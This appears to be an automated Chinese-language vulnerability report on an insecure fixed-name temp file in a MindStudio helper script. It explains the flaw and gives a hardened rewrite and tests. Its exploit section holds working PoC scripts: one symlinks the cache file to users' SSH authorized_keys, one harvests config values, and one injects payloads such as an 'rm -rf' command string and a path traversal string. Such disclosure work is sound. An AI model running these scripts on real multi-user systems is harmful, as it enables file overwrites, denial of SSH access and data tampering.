# msopgen-keep_soc_info-tmpfile-001：临时文件固定命名致符号链接攻击风险

## 漏洞标识
- **漏洞ID**: msopgen-keep_soc_info-tmpfile-001
- **类型**: Insecure Temporary File (不安全临时文件)
- **CWE**: CWE-377 - Insecure Temporary File Creation
- **严重性**: Medium
- **置信度**: 95%

## 漏洞概述

在 MindStudio 项目的算子开发工具脚本 `keep_soc_info.py` 中，存在一个典型的临时文件安全漏洞。该脚本使用固定的文件名在临时目录中创建缓存文件，且未使用安全标志位，导致符号链接攻击和数据泄露风险。

## 漏洞位置

**文件**: `example/quick_start/msopgen/keep_soc_info.py`

**漏洞代码**:
```python
# 第25行：定义固定的缓存文件路径
CACHE_FILE = os.path.join(tempfile.gettempdir(), "addconfig_cache.txt")

# 第37-38行：不安全的文件写入操作
with open(CACHE_FILE, "w") as f:
    f.write(value)
```

**相关函数**:
- `get_config()` - 第29-38行：提取配置并写入缓存
- `set_config()` - 第41-55行：从缓存读取配置并恢复

## 漏洞原理分析

### 1. 核心问题

该漏洞属于 **TOCTOU (Time-of-Check to Time-of-Use)** 竞态条件漏洞的一个实例：

1. **固定文件名**: 使用固定的 `addconfig_cache.txt` 文件名
2. **可预测路径**: 文件路径 `/tmp/addconfig_cache.txt` 完全可预测
3. **缺少排他性标志**: `open(..., "w")` 没有使用 `O_EXCL` 标志
4. **世界可写目录**: 临时目录 `/tmp` 对所有用户可写

### 2. 攻击面分析

#### 攻击面 1: 符号链接攻击 (Symlink Attack)

**攻击原理**: 攻击者预先在临时目录创建符号链接，指向任意目标文件。当受害者运行脚本时，写入操作会跟随符号链接，导致目标文件被覆盖或创建。

**攻击前提**:
- 多用户共享系统环境
- 攻击者能够预测或监听脚本执行时机
- 临时目录权限配置正常（/tmp 通常对所有人可写）

**攻击流程**:
```
时间线:
T0: 攻击者创建符号链接
    ln -s /home/victim/.ssh/authorized_keys /tmp/addconfig_cache.txt

T1: 受害者执行 get 操作
    python3 keep_soc_info.py get ./op_host/add_custom.cpp

T2: 脚本打开文件进行写入
    with open(CACHE_FILE, "w") as f:  # 跟随符号链接
        f.write("ascend910b")

T3: 目标文件被覆盖
    /home/victim/.ssh/authorized_keys 现在包含 "ascend910b"
```

#### 攻击面 2: 信息泄露

**攻击原理**: 缓存文件使用全局可读权限创建（默认 umask 通常为 022 或 002），任何用户都可以读取其内容。

**攻击流程**:
```
T1: 受害者执行 get 操作
    python3 keep_soc_info.py get ./op_host/add_custom.cpp
    
    → 缓存文件包含 SoC 配置信息

T2: 攻击者读取缓存文件
    cat /tmp/addconfig_cache.txt
    
    → 获取目标环境的硬件配置信息
```

**泄露信息类型**:
- SoC 芯片型号配置（如 "ascend910b"）
- 可能的其他敏感配置参数
- 环境部署架构信息

#### 攻击面 3: 数据篡改

**攻击原理**: 攻击者在 `get` 和 `set` 操作之间修改缓存文件内容，导致目标源文件被注入恶意配置。

**攻击流程**:
```
T1: 受害者执行 get 操作
    python3 keep_soc_info.py get ./op_host/add_custom.cpp
    
    → 缓存文件: "ascend910b"

T2: 攻击者篡改缓存文件
    echo "malicious_config" > /tmp/addconfig_cache.txt

T3: 受害者执行 set 操作
    python3 keep_soc_info.py set ./op_host/add_custom.cpp
    
    → 源文件被注入恶意配置: AddConfig("malicious_config")
```

## 漏洞利用分析

### 利用场景 1: SSH 密钥覆盖攻击

**目标**: 覆盖受害者的 SSH 授权密钥文件，实现权限提升或拒绝服务。

**PoC 代码**:
```bash
#!/bin/bash
# 攻击者执行 (需要有本地访问权限)

# 步骤1: 监听目标用户活动
while true; do
    # 检查缓存文件是否存在（说明刚执行了 get 操作）
    if [ -f /tmp/addconfig_cache.txt ]; then
        echo "[*] 检测到 keep_soc_info.py 执行"
        break
    fi
    sleep 0.1
done

# 步骤2: 提前准备符号链接（用于下次执行）
# 针对不同用户进行攻击
for user in $(ls /home); do
    if [ -d /home/$user/.ssh ]; then
        # 创建符号链接指向受害者的 authorized_keys
        ln -sf /home/$user/.ssh/authorized_keys /tmp/addconfig_cache.txt
        echo "[+] 创建符号链接: /tmp/addconfig_cache.txt -> /home/$user/.ssh/authorized_keys"
        
        # 等待受害者执行 set 操作或再次执行 get 操作
        # 这将覆盖 authorized_keys，导致 SSH 登录失败
    fi
done
```

**影响**:
- 受害者的 SSH 密钥认证失效
- 可能导致系统无法远程管理
- 在某些配置下可能导致权限提升

### 利用场景 2: 配置信息窃取

**PoC 代码**:
```bash
#!/bin/bash
# 攻击者执行 - 持续监控缓存文件

while true; do
    if [ -f /tmp/addconfig_cache.txt ]; then
        # 读取配置信息
        config=$(cat /tmp/addconfig_cache.txt)
        timestamp=$(date '+%Y-%m-%d %H:%M:%S')
        
        # 记录窃取的信息
        echo "[$timestamp] 窃取配置: $config" >> /tmp/stolen_configs.log
        
        # 可选：分析配置推断环境信息
        if [[ "$config" == *"ascend910b"* ]]; then
            echo "[+] 检测到 Ascend 910B 环境" >> /tmp/stolen_configs.log
        fi
    fi
    sleep 1
done
```

### 利用场景 3: 供应链攻击 - 注入恶意配置

**PoC 代码**:
```python
#!/usr/bin/env python3
# 攻击者脚本 - 篡改缓存文件注入恶意配置

import os
import time

CACHE_FILE = "/tmp/addconfig_cache.txt"

# 恶意配置：可能导致构建失败或引入漏洞
MALICIOUS_CONFIGS = [
    '"; system("rm -rf /tmp/*"); //',  # 命令注入尝试
    '../../../etc/passwd',               # 路径遍历尝试
    'DROP TABLE users; --',             # SQL 注入模式（如果后续处理）
]

while True:
    if os.path.exists(CACHE_FILE):
        # 读取原始配置
        try:
            with open(CACHE_FILE, 'r') as f:
                original = f.read()
            
            # 替换为恶意配置
            with open(CACHE_FILE, 'w') as f:
                f.write(MALICIOUS_CONFIGS[0])
            
            print(f"[+] 篡改缓存: {original} -> {MALICIOUS_CONFIGS[0]}")
        except:
            pass
    
    time.sleep(0.5)
```

## 实际风险评估

### 风险等级: **中高风险**

### 影响范围

1. **部署环境敏感**: 该脚本用于 Ascend 算子开发，通常在企业开发环境或生产部署环境使用
2. **多用户环境**: 开发服务器通常是多用户共享环境，攻击面大
3. **配置敏感**: SoC 配置信息可能涉及硬件架构、部署拓扑等敏感信息
4. **自动化流程**: 该脚本可能在 CI/CD 流水线中自动化执行，扩大攻击窗口

### 攻击可达性

| 攻击向量 | 可达性 | 影响 | 复杂度 |
|---------|--------|------|--------|
| 符号链接攻击 | 高 | 高（文件覆盖） | 低 |
| 信息泄露 | 高 | 中（配置泄露） | 低 |
| 数据篡改 | 中 | 高（供应链风险） | 低 |

### 实际利用条件

- ✅ 共享开发服务器环境（常见）
- ✅ 攻击者有本地访问权限（常见）
- ✅ 脚本定期执行（CI/CD 流程）
- ❌ 需要精确的时间窗口（但可通过监控实现）

## 修复建议

### 推荐修复方案: 使用安全的临时文件API

```python
import tempfile
import os

# 修复方案1: 使用 tempfile.mkstemp() 创建安全临时文件
def get_config_secure_v1(filepath):
    """使用 mkstemp 创建安全的临时文件"""
    with open(filepath, "r") as f:
        content = f.read()
    match = PATTERN.search(content)
    if not match:
        print(f"未在 {filepath} 中找到 AddConfig(...)")
        return
    
    value = match.group(2)
    
    # 创建安全的临时文件（自动设置 O_EXCL 标志）
    fd, temp_path = tempfile.mkstemp(suffix='.txt', prefix='addconfig_cache_')
    try:
        with os.fdopen(fd, 'w') as f:
            f.write(value)
        
        # 设置文件权限（仅所有者可读写）
        os.chmod(temp_path, 0o600)
        
        # 保存路径到安全位置（如用户目录）
        cache_info = os.path.expanduser('~/.addconfig_cache_path')
        with open(cache_info, 'w') as f:
            f.write(temp_path)
    except:
        os.unlink(temp_path)
        raise

# 修复方案2: 使用用户私有目录
def get_config_secure_v2(filepath):
    """使用用户私有目录存储缓存"""
    with open(filepath, "r") as f:
        content = f.read()
    match = PATTERN.search(content)
    if not match:
        print(f"未在 {filepath} 中找到 AddConfig(...)")
        return
    
    value = match.group(2)
    
    # 使用用户私有目录
    cache_dir = os.path.expanduser('~/.cache/msopgen')
    os.makedirs(cache_dir, mode=0o700, exist_ok=True)
    
    cache_file = os.path.join(cache_dir, 'addconfig_cache.txt')
    
    # 使用 O_EXCL 标志创建文件
    fd = os.open(cache_file, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        with os.fdopen(fd, 'w') as f:
            f.write(value)
    except FileExistsError:
        # 文件已存在，安全地覆盖
        fd = os.open(cache_file, os.O_WRONLY | os.O_TRUNC, 0o600)
        with os.fdopen(fd, 'w') as f:
            f.write(value)

# 修复方案3: 使用 tempfile.NamedTemporaryFile
def get_config_secure_v3(filepath):
    """使用 NamedTemporaryFile（但需要注意文件名持久化问题）"""
    with open(filepath, "r") as f:
        content = f.read()
    match = PATTERN.search(content)
    if not match:
        print(f"未在 {filepath} 中找到 AddConfig(...)")
        return
    
    value = match.group(2)
    
    # 创建临时文件（自动设置 O_EXCL）
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', 
                                      prefix='addconfig_cache_', 
                                      delete=False) as f:
        f.write(value)
        temp_path = f.name
    
    # 设置权限
    os.chmod(temp_path, 0o600)
    
    # 保存路径
    cache_info = os.path.expanduser('~/.addconfig_cache_path')
    with open(cache_info, 'w') as f:
        f.write(temp_path)
```

### 完整修复代码

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
# -------------------------------------------------------------------------
# This file is part of the MindStudio project.
# Copyright (c) 2025 Huawei Technologies Co.,Ltd.
#
# MindStudio is licensed under Mulan PSL v2.
# You can use this software according to the terms and conditions of the Mulan PSL v2.
# You may obtain a copy of Mulan PSL v2 at:
#
#          http://license.coscl.org.cn/MulanPSL2
#
# THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND,
# EITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT,
# MERCHANTABILITY OR FIT FOR A PARTICULAR PURPOSE.
# See the Mulan PSL v2 for more details.
# -------------------------------------------------------------------------
"""
import argparse
import os
import re
import tempfile
import stat

# 使用用户私有目录存储缓存
CACHE_DIR = os.path.expanduser('~/.cache/msopgen')
CACHE_FILE = os.path.join(CACHE_DIR, 'addconfig_cache.txt')
PATTERN = re.compile(r'(\.AddConfig\()"([^"]*)"(\))')


def ensure_cache_dir():
    """确保缓存目录存在且权限正确"""
    if not os.path.exists(CACHE_DIR):
        os.makedirs(CACHE_DIR, mode=0o700, exist_ok=True)
    else:
        # 验证目录权限
        dir_stat = os.stat(CACHE_DIR)
        if stat.S_IMODE(dir_stat.st_mode) != 0o700:
            os.chmod(CACHE_DIR, 0o700)


def get_config(filepath):
    """提取配置并安全地写入缓存"""
    with open(filepath, "r") as f:
        content = f.read()
    match = PATTERN.search(content)
    if not match:
        print(f"未在 {filepath} 中找到 AddConfig(...)")
        return
    
    value = match.group(2)
    
    # 确保缓存目录安全
    ensure_cache_dir()
    
    # 使用 O_EXCL 标志安全创建文件
    try:
        fd = os.open(CACHE_FILE, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    except FileExistsError:
        # 文件已存在，验证文件所有权和权限
        file_stat = os.stat(CACHE_FILE)
        if file_stat.st_uid != os.getuid():
            raise RuntimeError(f"安全错误: 缓存文件所有权异常")
        if stat.S_IMODE(file_stat.st_mode) != 0o600:
            raise RuntimeError(f"安全错误: 缓存文件权限异常")
        
        # 安全地覆盖现有文件
        fd = os.open(CACHE_FILE, os.O_WRONLY | os.O_TRUNC, 0o600)
    
    try:
        with os.fdopen(fd, 'w') as f:
            f.write(value)
        print(f"配置已缓存: {value}")
    except:
        os.close(fd)
        raise


def set_config(filepath):
    """从缓存安全读取配置并恢复"""
    if not os.path.exists(CACHE_FILE):
        print(f"缓存文件不存在: {CACHE_FILE}，请先执行 get")
        return
    
    # 验证文件所有权和权限
    file_stat = os.stat(CACHE_FILE)
    if file_stat.st_uid != os.getuid():
        raise RuntimeError(f"安全错误: 缓存文件所有权异常")
    if stat.S_IMODE(file_stat.st_mode) != 0o600:
        raise RuntimeError(f"安全错误: 缓存文件权限异常")
    
    with open(CACHE_FILE, "r") as f:
        saved_value = f.read().strip()
    
    with open(filepath, "r") as f:
        content = f.read()
    
    if not PATTERN.search(content):
        print(f"未在 {filepath} 中找到 AddConfig(...)")
        return
    
    new_content = PATTERN.sub(rf'\1"{saved_value}"\3', content)
    with open(filepath, "w") as f:
        f.write(new_content)
    
    print(f"Restore Soc Info: {saved_value}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="管理 AddConfig 参数")
    parser.add_argument("action", choices=["get", "set"], 
                        help="get: 读取并缓存参数; set: 从缓存恢复参数")
    parser.add_argument("file", help="要操作的 C++ 源文件路径")
    args = parser.parse_args()

    if args.action == "get":
        get_config(args.file)
    else:
        set_config(args.file)
```

### 修复要点

1. **使用用户私有目录**: `~/.cache/msopgen/` 替代 `/tmp/`
2. **设置严格权限**: 目录 0o700，文件 0o600
3. **验证所有权**: 读取前检查文件所有权
4. **使用 O_EXCL 标志**: 防止符号链接攻击
5. **错误处理**: 异常情况下安全清理资源

## 验证方法

### 测试用例 1: 符号链接攻击防护验证

```bash
# 尝试创建符号链接攻击
ln -s /tmp/test_target /home/user/.cache/msopgen/addconfig_cache.txt

# 运行脚本（应该失败或拒绝跟随符号链接）
python3 keep_soc_info.py get ./test.cpp
```

### 测试用例 2: 权限验证

```bash
# 检查目录权限
ls -ld ~/.cache/msopgen/
# 应该显示: drwx------ (0o700)

# 检查文件权限
ls -l ~/.cache/msopgen/addconfig_cache.txt
# 应该显示: -rw------- (0o600)
```

### 测试用例 3: 跨用户隔离

```bash
# 用户A创建缓存
user_a$ python3 keep_soc_info.py get ./test.cpp

# 用户B尝试读取（应该失败）
user_b$ cat /home/user_a/.cache/msopgen/addconfig_cache.txt
# 应该显示: Permission denied
```

## 参考资料

1. **CWE-377**: Insecure Temporary File
   - https://cwe.mitre.org/data/definitions/377.html

2. **CWE-59**: Improper Link Resolution Before File Access ('Link Following')
   - https://cwe.mitre.org/data/definitions/59.html

3. **OWASP Path Traversal**
   - https://owasp.org/www-community/attacks/Path_Traversal

4. **Python tempfile Documentation**
   - https://docs.python.org/3/library/tempfile.html

## 结论

该漏洞是一个真实存在且具有实际利用价值的安全问题。在多用户开发环境中，攻击者可以利用此漏洞进行符号链接攻击、信息泄露或数据篡改。建议立即采用推荐的修复方案，使用用户私有目录和安全文件创建标志来消除此漏洞。

---

**报告生成时间**: 2026-04-21  
**分析者**: details-worker  
**漏洞状态**: 已确认 (CONFIRMED)
